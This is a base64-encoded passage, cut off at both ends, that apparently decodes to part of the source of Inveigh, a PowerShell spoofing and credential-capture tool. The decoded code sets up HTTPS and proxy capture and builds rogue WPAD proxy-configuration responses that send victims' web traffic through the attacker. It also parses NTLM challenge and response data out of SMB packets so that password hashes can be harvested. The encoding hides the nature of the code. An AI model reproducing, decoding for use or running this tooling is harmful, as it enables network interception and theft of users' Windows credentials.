XNzdWVyIC1tYXRjaCAkaW52ZWlnaC5jZXJ0aWZpY2F0ZV9pc3N1ZXJ9KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZigkSFRUUFNGb3JjZUNlcnREZWxldGUgLWVxICdZJykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5IVFRQU19mb3JjZV9jZXJ0aWZpY2F0ZV9kZWxldGUgPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBTX2V4aXN0aW5nX2NlcnRpZmljYXRlID0gJHRydWUKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIENhcHR1cmUgPSBVc2luZyBFeGlzdGluZyBDZXJ0aWZpY2F0ZSIpICA+ICRudWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRpbnZlaWdoLkhUVFBTID0gJHRydWUKCiAgICAgICAgICAgIGlmKCRIVFRQSVAgLW5lICcwLjAuMC4wJykKICAgICAgICAgICAgeyAKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFBTIElQID0gJEhUVFBJUCIpID4gJG51bGwKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJEhUVFBTUG9ydCAtbmUgNDQzKQogICAgICAgICAgICB7ICAgCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQUyBQb3J0ID0gJEhUVFBTUG9ydCIpID4gJG51bGwKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUFMgQ2FwdHVyZSA9IEVuYWJsZWQiKSAgPiAkbnVsbAoKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgICRIVFRQUyA9ICJOIgogICAgICAgICAgICAkaW52ZWlnaC5IVFRQUyA9ICRmYWxzZQogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQUyBDYXB0dXJlIERpc2FibGVkIER1ZSBUbyBDZXJ0aWZpY2F0ZSBFcnJvciIpICA+ICRudWxsCiAgICAgICAgfQoKICAgIH0KCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQUyBDYXB0dXJlID0gRGlzYWJsZWQiKSAgPiAkbnVsbAp9CgppZigkSFRUUCAtZXEgJ1knIC1vciAkSFRUUFMgLWVxICdZJykKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUC9IVFRQUyBBdXRoZW50aWNhdGlvbiA9ICRIVFRQQXV0aCIpICA+ICRudWxsCiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXUEFEIEF1dGhlbnRpY2F0aW9uID0gJFdQQURBdXRoIikgID4gJG51bGwKCiAgICBpZigkV1BBREF1dGggLWxpa2UgIk5UTE0qIikKICAgIHsKICAgICAgICAkV1BBREF1dGhJZ25vcmUgPSAoJFdQQURBdXRoSWdub3JlIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICRfLlRyaW0oKX0pCgogICAgICAgIGlmKCRXUEFEQXV0aElnbm9yZS5Db3VudCAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIldQQUQgTlRMTSBBdXRoZW50aWNhdGlvbiBJZ25vcmUgTGlzdCA9ICIgKyAoJFdQQURBdXRoSWdub3JlIC1qb2luICIsIikpICA+ICRudWxsCiAgICAgICAgfQoKICAgIH0KCiAgICBpZigkSFRUUERpciAtYW5kICEkSFRUUFJlc3BvbnNlKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAvSFRUUFMgRGlyZWN0b3J5ID0gJEhUVFBEaXIiKSAgPiAkbnVsbAoKICAgICAgICBpZigkSFRUUERlZmF1bHRGaWxlKQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUC9IVFRQUyBEZWZhdWx0IFJlc3BvbnNlIEZpbGUgPSAkSFRUUERlZmF1bHRGaWxlIikgID4gJG51bGwKICAgICAgICB9CgogICAgICAgIGlmKCRIVFRQRGVmYXVsdEVYRSkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAvSFRUUFMgRGVmYXVsdCBSZXNwb25zZSBFeGVjdXRhYmxlID0gJEhUVFBEZWZhdWx0RVhFIikgID4gJG51bGwKICAgICAgICB9CgogICAgfQoKICAgIGlmKCRIVFRQUmVzcG9uc2UpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUC9IVFRQUyBSZXNwb25zZSA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgfQoKICAgIGlmKCRIVFRQUmVzcG9uc2UgLW9yICRIVFRQRGlyIC1hbmQgJEhUVFBDb250ZW50VHlwZSAtbmUgJ2h0bWwvdGV4dCcpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiSFRUUC9IVFRQUy9Qcm94eSBDb250ZW50IFR5cGUgPSAkSFRUUENvbnRlbnRUeXBlIikgID4gJG51bGwKICAgIH0KCiAgICBpZigkSFRUUEF1dGggLWVxICdCYXNpYycgLW9yICRXUEFEQXV0aCAtZXEgJ0Jhc2ljJykKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJCYXNpYyBBdXRoZW50aWNhdGlvbiBSZWFsbSA9ICRIVFRQQmFzaWNSZWFsbSIpICA+ICRudWxsCiAgICB9CgogICAgJEhUVFBSZXNldERlbGF5ID0gKCRIVFRQUmVzZXREZWxheSB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAkXy5UcmltKCl9KQoKICAgIGlmKCRIVFRQUmVzZXREZWxheS5Db3VudCAtZ3QgMCkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJIVFRQIFJlc2V0IERlbGF5IExpc3QgPSAiICsgKCRIVFRQUmVzZXREZWxheSAtam9pbiAiLCIpKSAgPiAkbnVsbAogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIkhUVFAgUmVzZXQgRGVsYXkgVGltZW91dCA9ICRIVFRQUmVzZXREZWxheVRpbWVvdXQgU2Vjb25kcyIpID4gJG51bGwKICAgIH0KCiAgICBpZigkUHJveHkgLWVxICdZJykKICAgIHsKCiAgICAgICAgaWYoJHByb3h5X3BvcnRfY2hlY2spCiAgICAgICAgewogICAgICAgICAgICAkUHJveHkgPSAiTiIKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJveHkgQ2FwdHVyZSBEaXNhYmxlZCBEdWUgVG8gSW4gVXNlIFBvcnQgJFByb3h5UG9ydCIpICA+ICRudWxsCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlByb3h5IENhcHR1cmUgPSBFbmFibGVkIikgID4gJG51bGwKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJveHkgUG9ydCA9ICRQcm94eVBvcnQiKSA+ICRudWxsCiAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlByb3h5IEF1dGhlbnRpY2F0aW9uID0gJFByb3h5QXV0aCIpICA+ICRudWxsCiAgICAgICAgICAgICRQcm94eVBvcnRGYWlsb3ZlciA9ICRQcm94eVBvcnQgKyAxCiAgICAgICAgICAgICRQcm94eUlnbm9yZSA9ICgkUHJveHlJZ25vcmUgfCBXaGVyZS1PYmplY3QgeyRfIC1hbmQgJF8uVHJpbSgpfSkKCiAgICAgICAgICAgIGlmKCRQcm94eUlnbm9yZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUHJveHkgSWdub3JlIExpc3QgPSAiICsgKCRQcm94eUlnbm9yZSAtam9pbiAiLCIpKSAgPiAkbnVsbAogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkUHJveHlJUCAtZXEgJzAuMC4wLjAnKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcHJveHlfV1BBRF9JUCA9ICRJUAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHByb3h5X1dQQURfSVAgPSAkUHJveHlJUAogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkV1BBRElQIC1hbmQgJFdQQURQb3J0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkV1BBRFJlc3BvbnNlID0gImZ1bmN0aW9uIEZpbmRQcm94eUZvclVSTCh1cmwsaG9zdCl7JFdQQURfZGlyZWN0X2hvc3RzX2Z1bmN0aW9uIHJldHVybiBgIlBST1hZICRwcm94eV9XUEFEX0lQYDokUHJveHlQb3J0OyBQUk9YWSAkV1BBRElQYDokV1BBRFBvcnQ7IERJUkVDVGAiO30iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkV1BBRFJlc3BvbnNlID0gImZ1bmN0aW9uIEZpbmRQcm94eUZvclVSTCh1cmwsaG9zdCl7JFdQQURfZGlyZWN0X2hvc3RzX2Z1bmN0aW9uIHJldHVybiBgIlBST1hZICRwcm94eV9XUEFEX0lQYDokUHJveHlQb3J0OyBQUk9YWSAkcHJveHlfd3BhZF9JUGA6JFByb3h5UG9ydEZhaWxvdmVyOyBESVJFQ1RgIjt9IgogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICB9CgogICAgaWYoJFdQQUREaXJlY3RIb3N0cykKICAgIHsKICAgICAgICBGb3JFYWNoKCRXUEFEX2RpcmVjdF9ob3N0IGluICRXUEFERGlyZWN0SG9zdHMpCiAgICAgICAgewogICAgICAgICAgICAkV1BBRF9kaXJlY3RfaG9zdHNfZnVuY3Rpb24gKz0gJ2lmIChkbnNEb21haW5Jcyhob3N0LCAiJyArICRXUEFEX2RpcmVjdF9ob3N0ICsgJyIpKSByZXR1cm4gIkRJUkVDVCI7JwogICAgICAgIH0KCiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiV1BBRCBEaXJlY3QgSG9zdHMgPSAiICsgKCRXUEFERGlyZWN0SG9zdHMgLWpvaW4gIiwiKSkgID4gJG51bGwKICAgIH0KCiAgICBpZigkV1BBRFJlc3BvbnNlIC1hbmQgJFByb3h5IC1lcSAnTicpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiV1BBRCBDdXN0b20gUmVzcG9uc2UgPSBFbmFibGVkIikgID4gJG51bGwKICAgIH0KICAgIGVsc2VpZigkV1BBRFJlc3BvbnNlIC1hbmQgJFByb3h5IC1lcSAnWScpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiV1BBRCBQcm94eSBSZXNwb25zZSA9IEVuYWJsZWQiKSAgPiAkbnVsbAoKICAgICAgICBpZigkV1BBRElQIC1hbmQgJFdQQURQb3J0KQogICAgICAgIHsKICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiV1BBRCBGYWlsb3ZlciA9ICRXUEFESVBgOiRXUEFEUG9ydCIpICA+ICRudWxsCiAgICAgICAgfQoKICAgIH0KICAgIGVsc2VpZigkV1BBRElQIC1hbmQgJFdQQURQb3J0KQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIldQQUQgUmVzcG9uc2UgPSBFbmFibGVkIikgID4gJG51bGwKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXUEFEID0gJFdQQURJUGA6JFdQQURQb3J0IikgID4gJG51bGwKICAgICAgICAKICAgICAgICBpZigkV1BBRERpcmVjdEhvc3RzKQogICAgICAgIHsKICAgICAgICAgICAgRm9yRWFjaCgkV1BBRF9kaXJlY3RfaG9zdCBpbiAkV1BBRERpcmVjdEhvc3RzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkV1BBRF9kaXJlY3RfaG9zdHNfZnVuY3Rpb24gKz0gJ2lmIChkbnNEb21haW5Jcyhob3N0LCAiJyArICRXUEFEX2RpcmVjdF9ob3N0ICsgJyIpKSByZXR1cm4gIkRJUkVDVCI7JwogICAgICAgICAgICB9CgogICAgICAgICAgICAkV1BBRFJlc3BvbnNlID0gImZ1bmN0aW9uIEZpbmRQcm94eUZvclVSTCh1cmwsaG9zdCl7IiArICRXUEFEX2RpcmVjdF9ob3N0c19mdW5jdGlvbiArICJyZXR1cm4gYCJQUk9YWSAiICsgJFdQQURJUCArICI6IiArICRXUEFEUG9ydCArICJgIjt9IgogICAgICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJXUEFEIERpcmVjdCBIb3N0cyA9ICIgKyAoJFdQQUREaXJlY3RIb3N0cyAtam9pbiAiLCIpKSAgPiAkbnVsbAogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkV1BBRFJlc3BvbnNlID0gImZ1bmN0aW9uIEZpbmRQcm94eUZvclVSTCh1cmwsaG9zdCl7JFdQQURfZGlyZWN0X2hvc3RzX2Z1bmN0aW9uIHJldHVybiBgIlBST1hZICRXUEFESVBgOiRXUEFEUG9ydDsgRElSRUNUYCI7fSIKICAgICAgICB9CgogICAgfQogICAgZWxzZWlmKCRXUEFERGlyZWN0RmlsZSAtZXEgJ1knKQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIldQQUQgRGVmYXVsdCBSZXNwb25zZSA9IEVuYWJsZWQiKSAgPiAkbnVsbAogICAgICAgICRXUEFEUmVzcG9uc2UgPSAiZnVuY3Rpb24gRmluZFByb3h5Rm9yVVJMKHVybCxob3N0KXtyZXR1cm4gYCJESVJFQ1RgIjt9IgogICAgfQoKICAgIGlmKCRDaGFsbGVuZ2UpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiTlRMTSBDaGFsbGVuZ2UgPSAkQ2hhbGxlbmdlIikgID4gJG51bGwKICAgIH0KCn0KCmlmKCRNYWNoaW5lQWNjb3VudHMgLWVxICdOJykKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiTWFjaGluZSBBY2NvdW50IENhcHR1cmUgPSBEaXNhYmxlZCIpICA+ICRudWxsCiAgICAkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzID0gJGZhbHNlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzID0gJHRydWUKfQoKaWYoJENvbnNvbGVPdXRwdXQgLW5lICdOJykKewoKICAgIGlmKCRDb25zb2xlT3V0cHV0IC1lcSAnWScpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVhbCBUaW1lIENvbnNvbGUgT3V0cHV0ID0gRW5hYmxlZCIpICA+ICRudWxsCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUmVhbCBUaW1lIENvbnNvbGUgT3V0cHV0ID0gJENvbnNvbGVPdXRwdXQiKSAgPiAkbnVsbAogICAgfQoKICAgICRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0ID0gJHRydWUKCiAgICBpZigkQ29uc29sZVN0YXR1cyAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJDb25zb2xlIFN0YXR1cyA9ICRDb25zb2xlU3RhdHVzIE1pbnV0ZSIpICA+ICRudWxsCiAgICB9CiAgICBlbHNlaWYoJENvbnNvbGVTdGF0dXMgLWd0IDEpCiAgICB7CiAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiQ29uc29sZSBTdGF0dXMgPSAkQ29uc29sZVN0YXR1cyBNaW51dGVzIikgID4gJG51bGwKICAgIH0KCn0KZWxzZQp7CgogICAgaWYoJGludmVpZ2gudG9vbCAtZXEgMSkKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgRGlzYWJsZWQgRHVlIFRvIEV4dGVybmFsIFRvb2wgU2VsZWN0aW9uIikgID4gJG51bGwKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgQ29uc29sZSBPdXRwdXQgPSBEaXNhYmxlZCIpICA+ICRudWxsCiAgICB9Cgp9CgppZigkQ29uc29sZVVuaXF1ZSAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5jb25zb2xlX3VuaXF1ZSA9ICRmYWxzZQp9CgppZigkRmlsZU91dHB1dCAtZXEgJ1knKQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgRmlsZSBPdXRwdXQgPSBFbmFibGVkIikgID4gJG51bGwKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIk91dHB1dCBEaXJlY3RvcnkgPSAkb3V0cHV0X2RpcmVjdG9yeSIpICA+ICRudWxsCiAgICAkaW52ZWlnaC5maWxlX291dHB1dCA9ICR0cnVlCn0KZWxzZQp7CiAgICAkaW52ZWlnaC5zdGF0dXNfcXVldWUuQWRkKCJSZWFsIFRpbWUgRmlsZSBPdXRwdXQgPSBEaXNhYmxlZCIpICA+ICRudWxsCn0KCmlmKCRGaWxlVW5pcXVlIC1lcSAnWScpCnsKICAgICRpbnZlaWdoLmZpbGVfdW5pcXVlID0gJHRydWUKfQplbHNlCnsKICAgICRpbnZlaWdoLmZpbGVfdW5pcXVlID0gJGZhbHNlCn0KCmlmKCRSdW5Db3VudCkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUnVuIENvdW50ID0gJFJ1bkNvdW50IikgPiAkbnVsbAp9CgppZigkUnVuVGltZSAtZXEgMSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUnVuIFRpbWUgPSAkUnVuVGltZSBNaW51dGUiKSAgPiAkbnVsbAp9CmVsc2VpZigkUnVuVGltZSAtZ3QgMSkKewogICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLkFkZCgiUnVuIFRpbWUgPSAkUnVuVGltZSBNaW51dGVzIikgID4gJG51bGwKfQoKaWYoJFNob3dIZWxwIC1lcSAnWScpCnsKICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlJ1biBTdG9wLUludmVpZ2ggdG8gc3RvcCBJbnZlaWdoIikgID4gJG51bGwKICAgICAgICAKICAgIGlmKCRpbnZlaWdoLmNvbnNvbGVfb3V0cHV0KQogICAgewogICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5BZGQoIlByZXNzIGFueSBrZXkgdG8gc3RvcCByZWFsIHRpbWUgY29uc29sZSBvdXRwdXQiKSAgPiAkbnVsbAogICAgfQoKfQoKaWYoJGludmVpZ2guc3RhdHVzX291dHB1dCkKewoKICAgIHdoaWxlKCRpbnZlaWdoLnN0YXR1c19xdWV1ZS5Db3VudCAtZ3QgMCkKICAgIHsKCiAgICAgICAgc3dpdGNoIC1XaWxkY2FyZCAoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgIHsKCiAgICAgICAgICAgIHskXyAtbGlrZSAiKiBEaXNhYmxlZCBEdWUgVG8gKiIgLW9yICRfIC1saWtlICJSdW4gU3RvcC1JbnZlaWdoIHRvIHN0b3AgSW52ZWlnaCIgLW9yICRfIC1saWtlICJXaW5kb3dzIEZpcmV3YWxsID0gRW5hYmxlZCJ9CiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5vdXRwdXRfc3RyZWFtX29ubHkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0KCRpbnZlaWdoLnN0YXR1c19xdWV1ZVswXSArICRpbnZlaWdoLm5ld2xpbmUpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZygkaW52ZWlnaC5zdGF0dXNfcXVldWVbMF0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGludmVpZ2guc3RhdHVzX3F1ZXVlLlJlbW92ZUF0KDApCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGRlZmF1bHQKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLm91dHB1dF9zdHJlYW1fb25seSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdICsgJGludmVpZ2gubmV3bGluZSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQoJGludmVpZ2guc3RhdHVzX3F1ZXVlWzBdKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRpbnZlaWdoLnN0YXR1c19xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgIH0KCiAgICB9Cgp9CgojIEJlZ2luIFNjcmlwdEJsb2NrcwoKIyBTaGFyZWQgQmFzaWMgRnVuY3Rpb25zIFNjcmlwdEJsb2NrCiRzaGFyZWRfYmFzaWNfZnVuY3Rpb25zX3NjcmlwdGJsb2NrID0KewoKICAgIGZ1bmN0aW9uIERhdGFUb1VJbnQxNigkZmllbGQpCiAgICB7CgkgICBbQXJyYXldOjpSZXZlcnNlKCRmaWVsZCkKCSAgIHJldHVybiBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvVUludDE2KCRmaWVsZCwwKQogICAgfQoKICAgIGZ1bmN0aW9uIERhdGFUb1VJbnQzMigkZmllbGQpCiAgICB7CgkgICBbQXJyYXldOjpSZXZlcnNlKCRmaWVsZCkKCSAgIHJldHVybiBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvVUludDMyKCRmaWVsZCwwKQogICAgfQoKICAgIGZ1bmN0aW9uIERhdGFMZW5ndGgyCiAgICB7CiAgICAgICAgcGFyYW0gKFtJbnRdJGxlbmd0aF9zdGFydCxbQnl0ZVtdXSRzdHJpbmdfZXh0cmFjdF9kYXRhKQoKICAgICAgICAkc3RyaW5nX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9VSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkKICAgICAgICByZXR1cm4gJHN0cmluZ19sZW5ndGgKICAgIH0KCiAgICBmdW5jdGlvbiBEYXRhTGVuZ3RoNAogICAgewogICAgICAgIHBhcmFtIChbSW50XSRsZW5ndGhfc3RhcnQsW0J5dGVbXV0kc3RyaW5nX2V4dHJhY3RfZGF0YSkKCiAgICAgICAgJHN0cmluZ19sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvVUludDMyKCRzdHJpbmdfZXh0cmFjdF9kYXRhWyRsZW5ndGhfc3RhcnQuLigkbGVuZ3RoX3N0YXJ0ICsgMyldLDApCiAgICAgICAgcmV0dXJuICRzdHJpbmdfbGVuZ3RoCiAgICB9CgogICAgZnVuY3Rpb24gRGF0YVRvU3RyaW5nCiAgICB7CiAgICAgICAgcGFyYW0gKFtJbnRdJHN0cmluZ19zdGFydCxbSW50XSRzdHJpbmdfbGVuZ3RoLFtCeXRlW11dJHN0cmluZ19leHRyYWN0X2RhdGEpCgogICAgICAgICRzdHJpbmdfZGF0YSA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHN0cmluZ19leHRyYWN0X2RhdGFbJHN0cmluZ19zdGFydC4uKCRzdHJpbmdfc3RhcnQgKyAkc3RyaW5nX2xlbmd0aCAtIDEpXSkKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEgLXJlcGxhY2UgIi0wMCIsIiIKICAgICAgICAkc3RyaW5nX2RhdGEgPSAkc3RyaW5nX2RhdGEuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICRzdHJpbmdfZXh0cmFjdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJHN0cmluZ19kYXRhLDAsJHN0cmluZ19kYXRhLkxlbmd0aCkKICAgICAgICByZXR1cm4gJHN0cmluZ19leHRyYWN0CiAgICB9CgogICAgZnVuY3Rpb24gQ29udmVydEZyb20tUGFja2V0T3JkZXJlZERpY3Rpb25hcnkKICAgIHsKICAgICAgICBwYXJhbSgkcGFja2V0X29yZGVyZWRfZGljdGlvbmFyeSkKCiAgICAgICAgRm9yRWFjaCgkZmllbGQgaW4gJHBhY2tldF9vcmRlcmVkX2RpY3Rpb25hcnkuVmFsdWVzKQogICAgICAgIHsKICAgICAgICAgICAgJGJ5dGVfYXJyYXkgKz0gJGZpZWxkCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJGJ5dGVfYXJyYXkKICAgIH0KCn0KCiMgU01CIE5UTE0gRnVuY3Rpb25zIFNjcmlwdEJsb2NrIC0gZnVuY3Rpb24gZm9yIHBhcnNpbmcgTlRMTSBjaGFsbGVuZ2UvcmVzcG9uc2UKJFNNQl9OVExNX2Z1bmN0aW9uc19zY3JpcHRibG9jayA9CnsKCiAgICBmdW5jdGlvbiBTTUJOVExNQ2hhbGxlbmdlCiAgICB7CiAgICAgICAgcGFyYW0gKFtCeXRlW11dJHBheWxvYWRfYnl0ZXMpCgogICAgICAgICRwYXlsb2FkID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlcykKICAgICAgICAkcGF5bG9hZCA9ICRwYXlsb2FkIC1yZXBsYWNlICItIiwiIgogICAgICAgICROVExNX2luZGV4ID0gJHBheWxvYWQuSW5kZXhPZigiNEU1NDRDNEQ1MzUzNTAwMCIpCgogICAgICAgIGlmKCROVExNX2luZGV4IC1ndCAwIC1hbmQgJHBheWxvYWQuU3ViU3RyaW5nKCgkTlRMTV9pbmRleCArIDE2KSw4KSAtZXEgIjAyMDAwMDAwIikKICAgICAgICB7CiAgICAgICAgICAgICROVExNX2NoYWxsZW5nZSA9ICRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1faW5kZXggKyA0OCksMTYpCiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJE5UTE1fY2hhbGxlbmdlCiAgICB9CgogICAgZnVuY3Rpb24gU01CTlRMTVJlc3BvbnNlCiAgICB7CiAgICAgICAgcGFyYW0gKFtCeXRlW11dJHBheWxvYWRfYnl0ZXMpCgogICAgICAgICRwYXlsb2FkID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlcykKICAgICAgICAkcGF5bG9hZCA9ICRwYXlsb2FkIC1yZXBsYWNlICItIiwiIgogICAgICAgICROVExNU1NQX2hleF9vZmZzZXQgPSAkcGF5bG9hZC5JbmRleE9mKCI0RTU0NEM0RDUzNTM1MDAwIikKCiAgICAgICAgaWYoJE5UTE1TU1BfaGV4X29mZnNldCAtZ3QgMCAtYW5kICRwYXlsb2FkLlN1YlN0cmluZygoJE5UTE1TU1BfaGV4X29mZnNldCArIDE2KSw4KSAtZXEgIjAzMDAwMDAwIikKICAgICAgICB7CiAgICAgICAgICAgICROVExNU1NQX29mZnNldCA9ICROVExNU1NQX2hleF9vZmZzZXQgLyAyCgogICAgICAgICAgICAkTE1fbGVuZ3RoID0gRGF0YUxlbmd0aDIgKCROVExNU1NQX29mZnNldCArIDEyKSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAkTE1fb2Zmc2V0ID0gRGF0YUxlbmd0aDQgKCROVExNU1NQX29mZnNldCArIDE2KSAkcGF5bG9hZF9ieXRlcwogICAgICAgICAgICAkTE1fcmVzcG9uc2UgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzWygkTlRMTVNTUF9vZmZzZXQgKyAkTE1fb2Zmc2V0KS4uKCROVExNU1NQX29mZnNldCArICRMTV9vZmZzZXQgKyAkTE1fbGVuZ3RoIC0gMSldKSAtcmVwbGFjZSAiLSIs